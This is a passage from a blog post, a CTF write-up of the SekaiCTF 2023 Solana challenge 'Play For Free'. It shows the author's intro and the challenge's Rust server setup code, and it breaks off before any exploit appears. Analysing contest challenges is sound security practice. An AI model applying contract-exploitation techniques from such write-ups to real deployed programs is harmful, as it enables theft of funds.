<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>SekaiCTF 2023 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:title" content="SekaiCTF 2023" />
<meta property="og:description" content="Writeup for SekaiCTF 2023" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/sekaictf-2023/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-27T23:00:38+07:00" />
<meta property="article:modified_time" content="2023-09-11T11:55:55+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png"/>

<meta name="twitter:title" content="SekaiCTF 2023"/>
<meta name="twitter:description" content="Writeup for SekaiCTF 2023"/>
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/sekaictf-2023/" /><link rel="prev" href="https://chovid99.github.io/posts/corctf-2023/" /><link rel="next" href="https://chovid99.github.io/posts/hitcon-ctf-2023/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "SekaiCTF 2023",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/sekaictf-2023\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, SekaiCTF, blockchain, evm, solana, solang, 2023","wordcount":  2939 ,
        "url": "https:\/\/chovid99.github.io\/posts\/sekaictf-2023\/","datePublished": "2023-08-27T23:00:38+07:00","dateModified": "2023-09-11T11:55:55+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Chovid99"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SekaiCTF 2023</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Aug 27, 2023">Aug 27, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2939 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;14 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#blockchain">Blockchain</a>
      <ul>
        <li><a href="#play-for-free">Play For Free</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a></li>
            <li><a href="#solution">Solution</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/bZdSqfl.png" title="https://i.imgur.com/bZdSqfl.png" data-thumbnail="https://i.imgur.com/bZdSqfl.png" data-sub-html="<h2>SekaiCTF 2023</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/bZdSqfl.png"
            data-srcset="https://i.imgur.com/bZdSqfl.png, https://i.imgur.com/bZdSqfl.png 1.5x, https://i.imgur.com/bZdSqfl.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/bZdSqfl.png" />
    </a><figcaption class="image-caption">SekaiCTF 2023</figcaption>
    </figure>
<p>Last weekend, I was spending some of my free time to participate in SekaiCTF 2023 with goals trying to get some bounty from solving the blockchain challenges. I had two attempts for two blockchain challenges called <code>Play For Free</code> and <code>Re-Remix</code>. Fortunately, I can get the second blood for the <code>Play For Free</code> challenge, but failed to get blood for the <code>Re-Remix</code> challenge.</p>
<img src="https://i.imgur.com/bqBCrR9.png"/>
<p>This is my writeup for the <code>Play For Free</code> challenge in the SekaiCTF 2023 (I didn&rsquo;t try <code>The Bidding</code> challenge because when I finished the <code>Play For Free</code> challenge, the bounty has been claimed by the others).</p>
<h1 id="blockchain">Blockchain</h1>
<h2 id="play-for-free">Play For Free</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>Tokens are consistently left around the arcade by generous individuals. We can gather these tokens and play 1pc for free!</p>
<p>Author: Y4nhu1</p>
</div>
        </div>
    </div>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>For this challenge, we were given a zip file called <code>dist.zip</code>. After I try to unzip it, turns out the setup is quite similar to the usual solana ctf challenge. As usual, let&rsquo;s start by inspecting the <code>server/src/main.rs</code> first, so that we know what is our goal in this challenge.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">solana_sdk</span>::<span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">signature</span>::<span class="p">{</span><span class="n">Keypair</span><span class="p">,</span><span class="w"> </span><span class="n">Signer</span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">pubkey</span>::<span class="n">Pubkey</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">instruction</span>::<span class="p">{</span><span class="n">Instruction</span><span class="p">,</span><span class="w"> </span><span class="n">AccountMeta</span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">solana_program_test</span>::<span class="n">tokio</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">solana_program</span>::<span class="p">{</span><span class="n">system_program</span><span class="p">,</span><span class="w"> </span><span class="n">system_instruction</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">sol_ctf_framework</span>::<span class="n">ChallengeBuilder</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">rand</span>::<span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">rngs</span>::<span class="n">StdRng</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">SeedableRng</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Rng</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">distributions</span>::<span class="p">{</span><span class="n">Alphanumeric</span><span class="p">,</span><span class="w"> </span><span class="n">DistString</span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">borsh</span>::<span class="n">ser</span>::<span class="n">BorshSerialize</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">fs</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">io</span>::<span class="n">Write</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">error</span>::<span class="n">Error</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">str</span>::<span class="n">FromStr</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">net</span>::<span class="p">{</span><span class="n">TcpListener</span><span class="p">,</span><span class="w"> </span><span class="n">TcpStream</span><span class="p">},</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cp">#[tokio::main]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">async</span><span class="w"> </span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">(),</span><span class="w"> </span><span class="nb">Box</span><span class="o">&lt;</span><span class="k">dyn</span><span class="w"> </span><span class="n">Error</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">listener</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TcpListener</span>::<span class="n">bind</span><span class="p">(</span><span class="s">&#34;0.0.0.0:8080&#34;</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;Listening on port 8080 ...&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">stream</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">listener</span><span class="p">.</span><span class="n">incoming</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stream</span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">tokio</span>::<span class="n">spawn</span><span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="k">move</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="n">err</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">handle_connection</span><span class="p">(</span><span class="n">stream</span><span class="p">).</span><span class="k">await</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;error: </span><span class="si">{:?}</span><span class="s">&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">err</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nb">Ok</span><span class="p">(())</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">async</span><span class="w"> </span><span class="k">fn</span> <span class="nf">handle_connection</span><span class="p">(</span><span class="k">mut</span><span class="w"> </span><span class="n">socket</span>: <span class="nc">TcpStream</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">(),</span><span class="w"> </span><span class="nb">Box</span><span class="o">&lt;</span><span class="k">dyn</span><span class="w"> </span><span class="n">Error</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">builder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ChallengeBuilder</span>::<span class="n">try_from</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">try_clone</span><span class="p">().</span><span class="n">unwrap</span><span class="p">()).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// load programs
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">pub_str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;ArciEpQvGwZk5yegHEiy27afRZaDLKU8B3kj5MWc38rq&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">program_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">builder</span><span class="p">.</span><span class="n">add_program</span><span class="p">(</span><span class="s">&#34;Arcade.so&#34;</span><span class="p">,</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">Pubkey</span>::<span class="n">from_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pub_str</span><span class="p">)</span><span class="o">?</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">solve_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">builder</span><span class="p">.</span><span class="n">input_program</span><span class="p">().</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">chall</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">builder</span><span class="p">.</span><span class="n">build</span><span class="p">().</span><span class="k">await</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">payer_keypair</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">chall</span><span class="p">.</span><span class="n">ctx</span><span class="p">.</span><span class="n">payer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">payer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">payer_keypair</span><span class="p">.</span><span class="n">pubkey</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// create user
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Keypair</span>::<span class="n">new</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// fund user
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="n">chall</span><span class="p">.</span><span class="n">run_ix</span><span class="p">(</span><span class="n">system_instruction</span>::<span class="n">transfer</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&amp;</span><span class="n">payer</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&amp;</span><span class="n">user</span><span class="p">.</span><span class="n">pubkey</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="mi">1_000_000_000</span><span class="p">,</span><span class="w">  </span><span class="c1">// 1 SOL
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="p">)).</span><span class="k">await</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// create data account
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">data_account</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Keypair</span>::<span class="n">new</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">constructor_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="fm">vec!</span><span class="p">[</span><span class="mh">0x87</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2c</span><span class="p">,</span><span class="w"> </span><span class="mh">0xcd</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x19</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbc</span><span class="p">];</span><span class="w">    </span><span class="c1">// discriminator
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">rng</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">StdRng</span>::<span class="n">from_entropy</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">constructor_data</span><span class="p">.</span><span class="n">extend_from_slice</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rng</span><span class="p">.</span><span class="n">gen</span>::<span class="o">&lt;</span><span class="kt">u64</span><span class="o">&gt;</span><span class="p">().</span><span class="n">to_be_bytes</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">constructor_data</span><span class="p">.</span><span class="n">extend_from_slice</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rng</span><span class="p">.</span><span class="n">gen</span>::<span class="o">&lt;</span><span class="kt">u64</span><span class="o">&gt;</span><span class="p">().</span><span class="n">to_be_bytes</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">constructor_data</span><span class="p">.</span><span class="n">extend_from_slice</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rng</span><span class="p">.</span><span class="n">gen</span>::<span class="o">&lt;</span><span class="kt">u64</span><span class="o">&gt;</span><span class="p">().</span><span class="n">to_be_bytes</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">random_address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Keypair</span>::<span class="n">new</span><span class="p">().</span><span class="n">pubkey</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">constructor_data</span><span class="p">.</span><span class="n">extend_from_slice</span><span class="p">(</span><span class="o">&amp;</span><span class="n">random_address</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">random_string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Alphanumeric</span><span class="p">.</span><span class="n">sample_string</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">rng</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">constructor_data</span><span class="p">.</span><span class="n">extend_from_slice</span><span class="p">(</span><span class="o">&amp;</span><span class="n">BorshSerialize</span>::<span class="n">try_to_vec</span><span class="p">(</span><span class="o">&amp;</span><span class="n">random_string</span><span class="p">)</span><span class="o">?</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// initialize
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="n">chall</span><span class="p">.</span><span class="n">run_ixs_full</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&amp;</span><span class="p">[</span><span class="n">Instruction</span>::<span class="n">new_with_bytes</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">program_id</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">&amp;</span><span class="n">constructor_data</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="fm">vec!</span><span class="p">[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="n">data_account</span><span class="p">.</span><span class="n">pubkey</span><span class="p">(),</span><span class="w"> </span><span class="kc">true</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">AccountMeta</span>::<span class="n">new</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">pubkey</span><span class="p">(),</span><span class="w"> </span><span class="kc">true</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">AccountMeta</span>::<span class="n">new_readonly</span><span class="p">(</span><span class="n">system_program</span>::<span class="n">id</span><span class="p">(),</span><span class="w"> </span><span class="kc">false</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">],</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">)],</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&amp;</span><span class="p">[</span><span class="o">&amp;</span><span class="n">data_account</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">user</span><span class="p">],</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="o">&amp;</span><span class="n">user</span><span class="p">.</span><span class="n">pubkey</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">).</span><span class="k">await</span><span class="o">?</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// create data account for user program
